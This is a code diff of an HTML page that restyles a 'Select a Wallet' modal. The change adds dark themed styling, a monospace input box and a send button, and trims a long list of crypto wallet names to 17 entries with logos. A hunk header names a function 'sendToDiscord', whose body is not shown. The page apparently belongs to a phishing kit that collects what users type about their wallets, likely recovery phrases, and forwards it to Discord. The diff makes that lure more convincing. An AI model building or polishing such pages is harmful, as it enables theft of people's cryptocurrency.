@@ -320,70 +320,109 @@
 	}
 
 	.wallet-scroll {
-    max-height: 280px;        /* scroll height */
-    overflow-y: scroll;       /* force scroll */
-    padding-top: 10px;        /* THIS is the padding that will show */
-    padding-bottom: 10px;
-    border: 1px solid #ccc;
-    border-radius: 8px;
-    background: #fff;
-    }
+		max-height: 200px;
+		overflow-y: auto;
+		border: 1px solid #1a1a1a;
+		border-radius: 8px;
+		background: #0d1117; /* dark technical background */
+		padding: 15px;
+		box-shadow: inset 0 0 10px rgba(0,0,0,0.6);
+	}
+
+
 
 
    .wallet-list-container {
-    max-height: 350px;
-    overflow-y: auto;
-    border: 1px solid #ccc;
-    border-radius: 8px;
+	max-height: 350px;
+	overflow-y: auto;
+	border: 1px solid #ccc;
+	border-radius: 8px;
 
-    /* THIS is the padding that will ALWAYS show */
-    
-    background: #fff;
-    }
+	/* THIS is the padding that will ALWAYS show */
+	
+	background: #fff;
+	}
 
 	
 	.wallet-list li {
+	  display: flex;
+	  align-items: center;
+	  gap: 10px; /* spacing between icon and text */
 	  padding: 12px;
-	  margin-buttom: 8px 0;
-	  background: #f1f1f1;
+	  margin-bottom: 8px;
+	  background: #161b22; /* dark technical background */
+	  border: 1px solid #2c2f36;
 	  border-radius: 6px;
 	  cursor: pointer;
-	  color: #002b5c;
+	  color: #00bfff; /* technical cyan text */
 	  font-weight: 600;
-	  transition: background 0.2s;
+	  font-family: "Courier New", monospace;
+	  transition: background 0.2s, transform 0.2s;
 	}
+
+
 	
 	.wallet-list li:hover {
-	  background: #e0e0e0;
+	  background: #1f2937;
+	  transform: scale(1.02);
 	}
+
+	.wallet-icon {
+	  width: 22px;
+	  height: 22px;
+	  object-fit: contain;
+	}
+
 	
 	textarea {
 	  width: 100%;
-	  height: 120px;
-	  padding: 10px;
-	  border-radius: 6px;
-	  border: 1px solid #ccc;
+	  height: 140px;
+	  padding: 12px;
+	  border-radius: 8px;
+	  border: 2px solid #00bfff;
+	  background: #0d1117;
+	  color: #00ffcc;
+	  font-family: "Courier New", monospace;
+	  font-size: 1rem;
+	  box-shadow: inset 0 0 12px rgba(0, 191, 255, 0.4);
 	  resize: none;
 	}
-	
+
+	textarea:focus {
+	  outline: none;
+	  border-color: #00ffcc;
+	  box-shadow: 0 0 12px #00ffcc;
+	}
+
+
+
 	.send-btn {
-	  background: #28a745;
-	  color: #fff;
-	  padding: 10px 20px;
-	  border-radius: 6px;
-	  border: none;
-	  cursor: pointer;
-	  margin-top: 10px;
+		background: linear-gradient(135deg, #00bfff, #00ffcc);
+		color: #000;
+		padding: 12px 24px;
+		border-radius: 6px;
+		border: none;
+		cursor: pointer;
+		font-weight: 700;
+		font-family: "Courier New", monospace;
+		transition: transform 0.2s, box-shadow 0.2s;
 	}
-	
+
+	.send-btn:hover {
+		transform: translateY(-2px);
+		box-shadow: 0 0 12px #00ffcc;
+	}
+
 	.close-btn {
-	  background: #ccc;
-	  padding: 10px 20px;
-	  border-radius: 6px;
-	  border: none;
-	  cursor: pointer;
-	  margin-top: 10px;
+		background: #2c2f36;
+		color: #fff;
+		padding: 10px 20px;
+		border-radius: 6px;
+		border: none;
+		cursor: pointer;
+		margin-top: 10px;
 	}
+
 
 
     /* TYPOGRAPHY */
@@ -636,80 +675,64 @@
   <div class="modal-content">
     <h3>Select a Wallet</h3>
     <div class="wallet-list-container">
-	    <div class="wallet-scroll">
-	        <ul class="wallet-list">
-	            <li onclick="openMessageBox('MetaMask')">MetaMask</li>
-	            <li onclick="openMessageBox('Trust Wallet')">Trust Wallet</li>
-	            <li onclick="openMessageBox('Coinbase Wallet')">Coinbase Wallet</li>
-	            <li onclick="openMessageBox('Ledger Live')">Ledger Live</li>
-	            <li onclick="openMessageBox('Exodus')">Exodus</li>
-	            <li onclick="openMessageBox('Atomic Wallet')">Atomic Wallet</li>
-	            <li onclick="openMessageBox('SafePal')">SafePal</li>
-	            <li onclick="openMessageBox('Rainbow Wallet')">Rainbow Wallet</li>
-	            <li onclick="openMessageBox('Zerion Wallet')">Zerion Wallet</li>
-	            <li onclick="openMessageBox('OKX Wallet')">OKX Wallet</li>
-	            <li onclick="openMessageBox('Binance Web3 Wallet')">Binance Web3 Wallet</li>
-	            <li onclick="openMessageBox('Crypto.com DeFi Wallet')">Crypto.com DeFi Wallet</li>
-	            <li onclick="openMessageBox('Phantom Wallet')">Phantom Wallet</li>
-	            <li onclick="openMessageBox('Keplr Wallet')">Keplr Wallet</li>
-	            <li onclick="openMessageBox('Trezor Suite')">Trezor Suite</li>
-	            <li onclick="openMessageBox('Argent Wallet')">Argent Wallet</li>
-	            <li onclick="openMessageBox('Gnosis Safe')">Gnosis Safe</li>
-	            <li onclick="openMessageBox('WalletConnect')">WalletConnect</li>
-	            <li onclick="openMessageBox('MyEtherWallet')">MyEtherWallet</li>
-	            <li onclick="openMessageBox('XDEFI Wallet')">XDEFI Wallet</li>
-	            <li onclick="openMessageBox('Coin98 Wallet')">Coin98 Wallet</li>
-	            <li onclick="openMessageBox('Math Wallet')">Math Wallet</li>
-	            <li onclick="openMessageBox('TokenPocket')">TokenPocket</li>
-	            <li onclick="openMessageBox('BitKeep')">BitKeep (Bitget Wallet)</li>
-	            <li onclick="openMessageBox('Guarda Wallet')">Guarda Wallet</li>
-	            <li onclick="openMessageBox('Infinity Wallet')">Infinity Wallet</li>
-	            <li onclick="openMessageBox('Enjin Wallet')">Enjin Wallet</li>
-	            <li onclick="openMessageBox('Loopring Wallet')">Loopring Wallet</li>
-	            <li onclick="openMessageBox('Pillar Wallet')">Pillar Wallet</li>
-	            <li onclick="openMessageBox('Ambire Wallet')">Ambire Wallet</li>
-	            <li onclick="openMessageBox('Frame Wallet')">Frame Wallet</li>
-	            <li onclick="openMessageBox('Rabby Wallet')">Rabby Wallet</li>
-	            <li onclick="openMessageBox('Brave Wallet')">Brave Wallet</li>
-	            <li onclick="openMessageBox('Opera Crypto Wallet')">Opera Crypto Wallet</li>
-	            <li onclick="openMessageBox('Zengo Wallet')">Zengo Wallet</li>
-	            <li onclick="openMessageBox('Core Wallet')">Core Wallet</li>
-	            <li onclick="openMessageBox('Unstoppable Wallet')">Unstoppable Wallet</li>
-	            <li onclick="openMessageBox('Nami Wallet')">Nami Wallet</li>
-	            <li onclick="openMessageBox('Yoroi Wallet')">Yoroi Wallet</li>
-	            <li onclick="openMessageBox('Daedalus Wallet')">Daedalus Wallet</li>
-	            <li onclick="openMessageBox('Temple Wallet')">Temple Wallet</li>
-	            <li onclick="openMessageBox('Kukai Wallet')">Kukai Wallet</li>
-	            <li onclick="openMessageBox('Petra Wallet')">Petra Wallet</li>
-	            <li onclick="openMessageBox('Martian Wallet')">Martian Wallet</li>
-	            <li onclick="openMessageBox('Sui Wallet')">Sui Wallet</li>
-	            <li onclick="openMessageBox('Pontem Wallet')">Pontem Wallet</li>
-	            <li onclick="openMessageBox('Solflare Wallet')">Solflare Wallet</li>
-	            <li onclick="openMessageBox('Slope Wallet')">Slope Wallet</li>
-	            <li onclick="openMessageBox('Backpack Wallet')">Backpack Wallet</li>
-	            <li onclick="openMessageBox('Glow Wallet')">Glow Wallet</li>
-	            <li onclick="openMessageBox('Talisman Wallet')">Talisman Wallet</li>
-	            <li onclick="openMessageBox('SubWallet')">SubWallet</li>
-	            <li onclick="openMessageBox('Fearless Wallet')">Fearless Wallet</li>
-	            <li onclick="openMessageBox('Polkawallet')">Polkawallet</li>
-	            <li onclick="openMessageBox('ONTO Wallet')">ONTO Wallet</li>
-	            <li onclick="openMessageBox('NeoLine Wallet')">NeoLine Wallet</li>
-	            <li onclick="openMessageBox('Xumm Wallet')">Xumm Wallet</li>
-	            <li onclick="openMessageBox('Casper Wallet')">Casper Wallet</li>
-	            <li onclick="openMessageBox('Alephium Wallet')">Alephium Wallet</li>
-	            <li onclick="openMessageBox('Electrum Wallet')">Electrum Wallet</li>
-	            <li onclick="openMessageBox('BlueWallet')">BlueWallet</li>
-	            <li onclick="openMessageBox('Wasabi Wallet')">Wasabi Wallet</li>
-	            <li onclick="openMessageBox('Samourai Wallet')">Samourai Wallet</li>
-	            <li onclick="openMessageBox('Edge Wallet')">Edge Wallet</li>
-	            <li onclick="openMessageBox('Coinomi Wallet')">Coinomi Wallet</li>
-	            <li onclick="openMessageBox('AirGap Wallet')">AirGap Wallet</li>
-	        </ul>
-	    </div>
+	  <div class="wallet-scroll">
+		<ul class="wallet-list">
+		  <li onclick="openMessageBox('MetaMask')">
+			<img src="https://cryptologos.cc/logos/metamask-metamask-logo.png" alt="MetaMask" class="wallet-icon"> MetaMask
+		  </li>
+		  <li onclick="openMessageBox('Trust Wallet')">
+			<img src="https://cryptologos.cc/logos/trust-wallet-trust-wallet-logo.png" alt="Trust Wallet" class="wallet-icon"> Trust Wallet
+		  </li>
+		  <li onclick="openMessageBox('Coinbase Wallet')">
+			<img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.png" alt="Coinbase Wallet" class="wallet-icon"> Coinbase Wallet
+		  </li>
+		  <li onclick="openMessageBox('Ledger Live')">
+			<img src="https://cryptologos.cc/logos/ledger-ledger-logo.png" alt="Ledger Live" class="wallet-icon"> Ledger Live
+		  </li>
+		  <li onclick="openMessageBox('Exodus')">
+			<img src="https://cryptologos.cc/logos/exodus-exodus-logo.png" alt="Exodus" class="wallet-icon"> Exodus
+		  </li>
+		  <li onclick="openMessageBox('Binance Web3 Wallet')">
+			<img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="Binance Wallet" class="wallet-icon"> Binance Web3 Wallet
+		  </li>
+		  <li onclick="openMessageBox('Crypto.com DeFi Wallet')">
+			<img src="https://cryptologos.cc/logos/crypto-com-coin-cro-logo.png" alt="Crypto.com Wallet" class="wallet-icon"> Crypto.com DeFi Wallet
+		  </li>
+		  <li onclick="openMessageBox('Phantom Wallet')">
+			<img src="https://cryptologos.cc/logos/phantom-phantom-logo.png" alt="Phantom Wallet" class="wallet-icon"> Phantom Wallet
+		  </li>
+		  <li onclick="openMessageBox('Keplr Wallet')">
+			<img src="https://cryptologos.cc/logos/keplr-keplr-logo.png" alt="Keplr Wallet" class="wallet-icon"> Keplr Wallet
+		  </li>
+		  <li onclick="openMessageBox('Trezor Suite')">
+			<img src="https://cryptologos.cc/logos/trezor-trezor-logo.png" alt="Trezor Suite" class="wallet-icon"> Trezor Suite
+		  </li>
+		  <li onclick="openMessageBox('Argent Wallet')">
+			<img src="https://cryptologos.cc/logos/argent-argent-logo.png" alt="Argent Wallet" class="wallet-icon"> Argent Wallet
+		  </li>
+		  <li onclick="openMessageBox('Gnosis Safe')">
+			<img src="https://cryptologos.cc/logos/gnosis-gno-logo.png" alt="Gnosis Safe" class="wallet-icon"> Gnosis Safe
+		  </li>
+		  <li onclick="openMessageBox('SafePal')">
+			<img src="https://cryptologos.cc/logos/safepal-sfp-logo.png" alt="SafePal" class="wallet-icon"> SafePal
+		  </li>
+		  <li onclick="openMessageBox('Rainbow Wallet')">
+			<img src="https://cryptologos.cc/logos/rainbow-rainbow-logo.png" alt="Rainbow Wallet" class="wallet-icon"> Rainbow Wallet
+		  </li>
+		  <li onclick="openMessageBox('OKX Wallet')">
+			<img src="https://cryptologos.cc/logos/okx-okx-logo.png" alt="OKX Wallet" class="wallet-icon"> OKX Wallet
+		  </li>
+		  <li onclick="openMessageBox('Zerion Wallet')">
+			<img src="https://cryptologos.cc/logos/zerion-zerion-logo.png" alt="Zerion Wallet" class="wallet-icon"> Zerion Wallet
+		  </li>
+
+		  <!-- Fallback for all other wallets -->
+		  <li onclick="openMessageBox('WalletConnect')">
+			<img src="https://cryptologos.cc/logos/walletconnect-walletconnect-logo.png" alt="WalletConnect" class="wallet-icon"> WalletConnect
+		  </li>
+		</ul>
+	  </div>
 	</div>
-
-
-
 
 
     <button class="close-btn" onclick="closeWalletModal()">Close</button>
@@ -811,7 +834,6 @@ function sendToDiscord() {
 </body>
 
 </html>
-
 
 
 
